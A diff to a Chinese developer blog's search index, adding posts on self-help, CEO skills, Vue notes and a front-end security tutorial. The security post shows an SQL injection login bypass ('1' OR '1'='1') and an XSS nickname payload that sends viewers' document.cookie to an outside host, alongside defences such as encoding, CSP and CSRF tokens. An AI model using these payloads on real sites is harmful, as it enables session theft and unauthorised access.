@@ -3,6 +3,141 @@
   
     
     <entry>
+      <title><![CDATA[我所追求的狼性]]></title>
+      <url>/%E6%88%91%E6%89%80%E8%BF%BD%E6%B1%82%E7%9A%84%E7%8B%BC%E6%80%A7.html</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="狼道"><a href="#狼道" class="headerlink" title="狼道"></a>狼道</h1><p>虽然在普通人看来，狼是一个贬义的存在，’狼子野心’,’狼狈为奸’。<br><br><br>但在大自然中，狼群相对于其他生物来说，更富有智慧，更有团结力。狼对机会的把握概率为80%，而人类只有35%左右，几十头狼就可以干翻白羊大军，如果在战场上，这是非常可怕的，所以我们可以从狼的身上学到很多可贵的精神和品质。</p>
+<h2 id="狼子野心"><a href="#狼子野心" class="headerlink" title="狼子野心"></a>狼子野心</h2><p>狼有非常大的野心，即使数量只有四十只左右，仍然有围剿百羊的勇气，即使猎物比自己体型大数倍，也敢于猎杀！</p>
+<h3 id="天生的野心家"><a href="#天生的野心家" class="headerlink" title="天生的野心家"></a>天生的野心家</h3><p>‘大丈夫在世，理应如此’，这就是当年项羽看到秦始皇所说的话，反正我感觉听到就有一种豪气冲天的气魄！</p>
+<blockquote>
+<p>寄语：没有完成不了的目标，就看你有没有野心去做！</p>
+</blockquote>
+<h3 id="紧盯自己的目标"><a href="#紧盯自己的目标" class="headerlink" title="紧盯自己的目标"></a>紧盯自己的目标</h3><p>‘当一个人知道自己的目标去处时，全世界都回为他让路’，出自爱默生。<br><br>没有目标的人在社会的最底层，目标模糊的人成为蓝领，目标明确的人成为白领，目标远大并记录下来的人，最后会成为社会的顶尖人士！(就像我现在做的)</p>
+<blockquote>
+<p>寄语：没有猎物，我们就去寻找，发现猎物我们就去追逐。寻找，发现，追逐，获得 - 这就是大自然强者生存的要素</p>
+</blockquote>
+<h2 id="人应该有理想，而不是’妄想’"><a href="#人应该有理想，而不是’妄想’" class="headerlink" title="人应该有理想，而不是’妄想’"></a>人应该有理想，而不是’妄想’</h2><p>野心 !== 妄想，人要有野心，但是也要根据实际出发，当实力悬殊的时候，当竞争法则不再公平的时候，退却是保存实力的最好方法，另一种生命的智慧。<br><br>妄想症的核心判断是总是包含着 ”我“，例如：”我伟大”,”人们在迫害我”，”我有罪”…….野心虽然也强调个体，但更多持有一种开放的态度，”我可以做的更好“，“我要达到某某那种程度”(当时我说，想成为类似奇舞团，alloyteam，类似大厂的技术团队，这是野心不是妄想)</p>
+<blockquote>
+<p>寄语：我们不缺乏成功的信念，但是我们绝对不会成为痴心妄想的傻瓜。狼群在面对枪口的时候，适当转移也是明智的选择。</p>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> 阅读 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 狼性 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[前端安全]]></title>
+      <url>/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="safetools-的使用方式"><a href="#safetools-的使用方式" class="headerlink" title="safetools 的使用方式"></a><font color="#aaf">safetools 的使用方式</font></h1><p><a href="http://h5.test.jimistore.com/base/xss" target="_blank" rel="noopener">demo</a></p>
+<ol>
+<li>引用 js 包（内容很少，也可以将内容拷贝出来，直接引用方法）</li>
+<li>将需要提交的数据经过 filter 即可，如下：</li>
+</ol>
+<pre><code>浏览器自带转换为字符串
+var newValue = safetools.encode(value)
+
+正则加密（可能有兼容）
+var newValue = safetools.reEncode(value)
+
+正则解密（可能有兼容）
+var newValue = safetools.reDecode(value)
+</code></pre><blockquote>
+<p>tag: 前端交互，涉及到数据流动并需要在返回在页面上显示的，一定要经过后端！</p>
+</blockquote>
+<p><br></p>
+<h1 id="常见的攻击手段"><a href="#常见的攻击手段" class="headerlink" title="常见的攻击手段"></a><font color="#aaf">常见的攻击手段</font></h1><h2 id="1-SQL-脚本注入攻击于与防御"><a href="#1-SQL-脚本注入攻击于与防御" class="headerlink" title="1. SQL 脚本注入攻击于与防御"></a><font color="#0af">1. SQL 脚本注入攻击于与防御</font></h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><blockquote>
+<p>用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入.</p>
+</blockquote>
+<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>语句</p>
+<pre><code>strSQL = &quot;SELECT * FROM users WHERE (name = &#39;&quot; + userName + &quot;&#39;) and (pw = &#39;&quot;+ passWord +&quot;&#39;);&quot;
+</code></pre><p>如果恶意填入：</p>
+<blockquote>
+<p>userName = “1’ OR ‘1’=’1”; passWord = “1’ OR ‘1’=’1”;</p>
+</blockquote>
+<p>既可实现无密码登录，美滋滋吧…</p>
+<h3 id="处理方式"><a href="#处理方式" class="headerlink" title="处理方式"></a>处理方式</h3><p>前端和 XSS 处理类似，对传递的数据进行筛选，重点是后端对数据的处理！</p>
+<h2 id="2-XSS-攻击与防御"><a href="#2-XSS-攻击与防御" class="headerlink" title="2. XSS 攻击与防御"></a><font color="#0af">2. XSS 攻击与防御</font></h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><blockquote>
+<p><font color="green">跨站脚本</font>（Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。<br>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+</blockquote>
+<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><h4 id="简单分类"><a href="#简单分类" class="headerlink" title="简单分类"></a>简单分类</h4><ol>
+<li>反射型xss<br><br>通过一次 xss 请求，将数据渲染到页面，请求 -&gt; 返回数据，例子：搜索</li>
+<li>储存型xss<br><br>通过一次 xss 请求，直接将数据储存在数据库，下次调用无需继续请求，例如：评论</li>
+</ol>
+<h4 id="复杂分类"><a href="#复杂分类" class="headerlink" title="复杂分类"></a>复杂分类</h4><ol>
+<li>client 型</li>
+<li>server 型</li>
+</ol>
+<h3 id="处理方式-1"><a href="#处理方式-1" class="headerlink" title="处理方式"></a>处理方式</h3><ul>
+<li><p>编码</p>
+<blockquote>
+<p>将 &gt; ( 标签转换为字符串，可以处理大多数 xss 攻击</p>
+</blockquote>
+</li>
+<li><p>过滤</p>
+<blockquote>
+<p>有的语句并不完全依赖&lt;&gt;标签，例如src=”javascript:alert(1);”</p>
+</blockquote>
+</li>
+<li><p>校正</p>
+<blockquote>
+<p>这个照理来说应该后端处理，目前没碰到这种场景</p>
+<pre><code>一个直播平台，用户可以进入观看，主播可以设置自己的昵称:
+var starNickName = &#39;${starNickname}&#39;
+</code></pre><p>这怕是要翻水水了…假设是我是主播，我把昵称设置为：</p>
+<pre><code>&#39;;window.location.href=&quot;http//:blog.jzxer.cn/?cook=&quot; + document.cookie + &#39;&amp;url=&#39; window.location.href;&#39;&#39;
+</code></pre><p>这一串如果传到后端，而后端又没有校正的话的话，这怕是傻眼了…观众进来一个死一个，我应该也会进去蹲几天吧，吧。。。</p>
+</blockquote>
+</li>
+<li>CSP<br>```<br>在头部加入：</li>
+</ul>
+<p><meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"><br>```<br>meta：不信任任何URL，即不加载任何资源样式表只信任 cdn.example.org 和 third-party.org 框架 (frame) 必须使用HTTPS协议加载 其他资源：没有限制 启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
+<blockquote>
+<p>注意：该属性目前比较新，hotfix 和 chorme 支持较好，并不适用于所有的浏览器。</p>
+</blockquote>
+<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3. CSRF"></a><font color="#0af">3. CSRF</font></h2><blockquote>
+<p><span style="color:green;">跨站请求伪造</span>（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p>
+</blockquote>
+<h3 id="处理方式-2"><a href="#处理方式-2" class="headerlink" title="处理方式"></a>处理方式</h3><ul>
+<li><p>验证码<br>在请求的同时，带个token,或者验证码</p>
+</li>
+<li><p>Referer Check<br>这个可以伪造…但加入更保险</p>
+</li>
+</ul>
+<blockquote>
+<p>注意：如果网站有XSS漏洞或者一些跨域漏洞，可能导致Token泄露。 在XSS攻击下，读取Token值，然后再构造出一个合法的请求，可以称为：XSRF。</p>
+</blockquote>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>web 安全是个需要长期坚持的事情，没有绝对安全的产品，我们需要做到的就是能够提前预防和及时修复。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> xss </tag>
+            
+            <tag> crsf </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[用vue撸一个二手商城]]></title>
       <url>/%E7%94%A8vue%E6%92%B8%E4%B8%80%E4%B8%AA%E4%BA%8C%E6%89%8B%E5%95%86%E5%9F%8E.html</url>
       <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="开发背景"><a href="#开发背景" class="headerlink" title="开发背景"></a>开发背景</h2><p>一直想尝试下全栈开发，想尝试一下，选题的初衷是自己对资源共享和二手市场的前景非常看好<br><br>共享资源的概念是有利于社会进步，并且是思维的一种跨越；未来一定是一个更美好的社会，我们需要做的就是让那一天尽早的到来</p>
@@ -1054,7 +1189,7 @@ if (isIE){
     <entry>
       <title><![CDATA[learn-koa]]></title>
       <url>/learn-koa.html</url>
-      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>暂时未上线~</p>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>app.use()</p>
 ]]></content>
       
         <categories>
@@ -1067,6 +1202,47 @@ if (isIE){
         <tags>
             
             <tag> koa </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[如何成为一名合格的CEO]]></title>
+      <url>/%E5%A6%82%E4%BD%95%E6%88%90%E4%B8%BA%E4%B8%80%E5%90%8D%E5%90%88%E6%A0%BC%E7%9A%84CEO.html</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h3 id="集中精力抓到要害问题"><a href="#集中精力抓到要害问题" class="headerlink" title="集中精力抓到要害问题"></a>集中精力抓到要害问题</h3><ul>
+<li>好的ceo善于俯视整个公司，确定最优先要做的事前，然后重点突破，一两件事就能使公司发生巨大的变化。如果你能抓住公司面临问题的要害之处，人们才会洗耳恭听</li>
+</ul>
+<h3 id="销售能力"><a href="#销售能力" class="headerlink" title="销售能力"></a>销售能力</h3><ul>
+<li>ceo 必须具备推销能力，把东西推销给客户和投资者，或者把革命思想推荐给公司</li>
+</ul>
+<h3 id="对财务的敏感"><a href="#对财务的敏感" class="headerlink" title="对财务的敏感"></a>对财务的敏感</h3><ul>
+<li>读懂数据，把纸上的东西和实际的公司情况结合起来，不仅仅是预算问题，也需要思考盈利的驱动力问题。</li>
+</ul>
+<h3 id="有策略头脑"><a href="#有策略头脑" class="headerlink" title="有策略头脑"></a>有策略头脑</h3><ul>
+<li>策略就是选择公司将参与角逐的竞技场，然后建立与这场竞争想关的优势。这样会考验你如何适应游戏规则并在游戏中获胜</li>
+</ul>
+<h3 id="管理变革的能力"><a href="#管理变革的能力" class="headerlink" title="管理变革的能力"></a>管理变革的能力</h3><ul>
+<li>在整个公司的变革，犹如管理一个部门，但要困难的多，你的行动要有号召力。你必须为人们树立一个榜样，挑选真确的管理团队，确定可能妨碍或阻止你的层层挑战</li>
+</ul>
+<h3 id="领导能力"><a href="#领导能力" class="headerlink" title="领导能力"></a>领导能力</h3><ul>
+<li>领导需要精力和激情。你必须先感召你自己，然后感召其他人。但激情也不是无根无据的滥用，一个坚定的长远目标很重要。</li>
+</ul>
+<h3 id="个性魅力"><a href="#个性魅力" class="headerlink" title="个性魅力"></a>个性魅力</h3><ul>
+<li>伟大的ceo知道什么时候用逻辑推理，什么时候相信自己的直觉，他们知道什么时候应该采取什么措施，什么时候听之任之，他知道什么时候管什么时候不要管。</li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> 生活 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 职场 </tag>
             
         </tags>
         
@@ -2159,6 +2335,85 @@ var speed = leng/(time/interval)  //每次位移量，就是一共调用多少�
     </entry>
     
     <entry>
+      <title><![CDATA[vue学习笔记（一）]]></title>
+      <url>/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="vue的实例对象与生命周期"><a href="#vue的实例对象与生命周期" class="headerlink" title="vue的实例对象与生命周期"></a>vue的实例对象与生命周期</h2><h3 id="vue-的生命周期图"><a href="#vue-的生命周期图" class="headerlink" title="vue 的生命周期图"></a>vue 的生命周期图</h3><p><img src="http://images.cnblogs.com/cnblogs_com/fly_dragon/276813/o_lifecycle-%E6%A0%87%E6%B3%A8%E7%89%88%E6%9C%AC.png" alt=""></p>
+<ul>
+<li><p>beforeCreate</p>
+<blockquote>
+<p>在实例初始化之后，数据观测(data observer) 和 event/watcher 事件配置之前被调用。</p>
+</blockquote>
+</li>
+<li><p>created</p>
+<blockquote>
+<p>实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(data observer)，属性和方法的运算， watch/event 事件回调。然而，挂载阶段还没开始，$el 属性目前不可见。</p>
+</blockquote>
+</li>
+<li><p>beforeMount</p>
+<blockquote>
+<p>在挂载开始之前被调用：相关的 render 函数首次被调用。</p>
+</blockquote>
+</li>
+<li><p>mounted</p>
+<blockquote>
+<p>el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子。如果 root 实例挂载了一个文档内元素，当 mounted 被调用时 vm.$el 也在文档内。</p>
+</blockquote>
+</li>
+<li><p>beforeUpdate</p>
+<blockquote>
+<p> 数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。 你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。</p>
+</blockquote>
+</li>
+<li><p>updated</p>
+<blockquote>
+<p> 由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。<br>当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。<br> 该钩子在服务器端渲染期间不被调用。</p>
+</blockquote>
+</li>
+<li><p>beforeDestroy</p>
+<blockquote>
+<p> 实例销毁之前调用。在这一步，实例仍然完全可用。</p>
+</blockquote>
+</li>
+<li><p>destroyed</p>
+<blockquote>
+<p> Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 该钩子在服务器端渲染期间不被调用。</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="实例对象"><a href="#实例对象" class="headerlink" title="实例对象"></a>实例对象</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><ul>
+<li>类型是Object或者Function。<blockquote>
+<p>var vm = new Vue({<br>data: data<br>})</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="computed"><a href="#computed" class="headerlink" title="computed"></a>computed</h3><ul>
+<li>介绍<br>Vue的计算属性（computed)的属性会自动混入Vue的实例中。所有 getter 和 setter 的 this 上下文自动地绑定为 Vue 实例。这就很强大了，再计算属性中定义的函数里面可以直接使用指向了 vue 实例的 this</li>
+</ul>
+<h3 id="methods"><a href="#methods" class="headerlink" title="methods"></a>methods</h3><ul>
+<li>类型: { [key: string]: Function }<br>methods 将被混入到 Vue 实例中。可以直接通过 VM 实例访问这些方法，或者在指令表达式中使用。方法中的 this 自动绑定为 Vue 实例。</li>
+</ul>
+<h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><ul>
+<li>类型： { [key: string]: string | Function | Object }<br>一个对象，键是需要观察的表达式，值是对应回调函数。值也可以是方法名，或者包含选项的对象。Vue 实例将会在实例化时调用 $watch()，遍历 watch 对象的每一个属性。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Vue的实例封装的还是挺有艺术性的，很符合开发者的思维规范，它的生命周期也非常清晰，使用起来也非常方便。MVVM双向绑定思想也是吊的可以</p>
+]]></content>
+      
+        <categories>
+            
+            <category> vue </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> vue </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[搭一个windows云服务器]]></title>
       <url>/%E6%90%AD%E4%B8%80%E4%B8%AAwindows%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
       <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>前段时间看到腾讯云服务器对学生有优惠，而且很大一坨，就买了一个回来研究，废话不多说，开搞咯~</p>
@@ -2280,45 +2535,6 @@ $ hexo deploy
     </entry>
     
     <entry>
-      <title><![CDATA[vuex 使用技巧]]></title>
-      <url>/vuex-%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D.html</url>
-      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h2><p>提供方法和API请求,类似于mutation</p>
-<blockquote>
-<p>mutation  修改 state 只能是同步的</p>
-<ul>
-<li>action 充满了各种异步 api<pre><code>actions: {
-  increment (context) {
-      context.commit(&#39;increment&#39;)
- }
-}
-另一种写法
-increment({commit}) {
-  commit(&#39;increment&#39;)
-}
-</code></pre></li>
-</ul>
-</blockquote>
-<h2 id="分发-Action"><a href="#分发-Action" class="headerlink" title="分发 Action"></a>分发 Action</h2><blockquote>
-<p>store.dispatch(‘increment’)</p>
-</blockquote>
-]]></content>
-      
-        <categories>
-            
-            <category> vue </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> vuex </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[vue高仿qq音乐官网]]></title>
       <url>/vue%E9%AB%98%E4%BB%BFqq%E9%9F%B3%E4%B9%90%E5%AE%98%E7%BD%91.html</url>
       <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>一直想做一个vue项目 然后呢 我就做了</p>
@@ -2423,11 +2639,50 @@ npm run start
         
         <tags>
             
-            <tag> vuex </tag>
-            
             <tag> vue </tag>
             
+            <tag> vuex </tag>
+            
             <tag> vue-router </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[vuex 使用技巧]]></title>
+      <url>/vuex-%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D.html</url>
+      <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h2><p>提供方法和API请求,类似于mutation</p>
+<blockquote>
+<p>mutation  修改 state 只能是同步的</p>
+<ul>
+<li>action 充满了各种异步 api<pre><code>actions: {
+  increment (context) {
+      context.commit(&#39;increment&#39;)
+ }
+}
+另一种写法
+increment({commit}) {
+  commit(&#39;increment&#39;)
+}
+</code></pre></li>
+</ul>
+</blockquote>
+<h2 id="分发-Action"><a href="#分发-Action" class="headerlink" title="分发 Action"></a>分发 Action</h2><blockquote>
+<p>store.dispatch(‘increment’)</p>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> vue </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> vuex </tag>
             
         </tags>
         
